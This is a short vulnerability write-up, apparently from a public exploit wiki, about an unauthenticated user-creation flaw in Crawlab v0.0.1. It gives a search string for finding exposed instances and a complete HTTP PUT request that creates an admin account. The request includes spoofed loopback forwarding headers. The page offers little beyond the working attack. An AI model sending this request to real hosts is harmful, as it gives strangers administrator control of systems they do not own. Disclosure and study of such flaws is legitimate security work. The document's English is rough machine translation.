# Crawlab users Add vulnerabilities to any user

## Vulnerability Description

The Crawlab users API has any user added and is added as an unauthorized interface. You can further attack in the background after adding it.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Crawlab v0.0.1</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="Crawlab"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639304614319-67b65509-55dd-4205-98cd-1ebdfb164e7b-20220313133455667.png)

First check the route location main.go file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639305087766-21949d4c-a274-45e2-b1ed-2b12a2b6450d.png)

```python
anonymousGrou 中为匿名可调用方法
authGroup	  中为认证可调用方法
```

You can see that the Putuser method is to add a user, but there is an anonymous call.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639305199370-192f958d-1a96-4842-8f12-7dc32376074d.png)

Generate requests to add users based on fields

```python
PUT /api/users HTTP/1.1
Host: 
Content-Length: 83
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

{"username":"testppp","password":"testppp","role":"admin","email":"testppp@qq.com"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639305372407-b81e6efc-2dde-403e-a7ad-ce5d0dd7cfa9.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1639305414874-3dc8bd9e-1d3d-44a0-a8a1-8c0d6affcddb.png)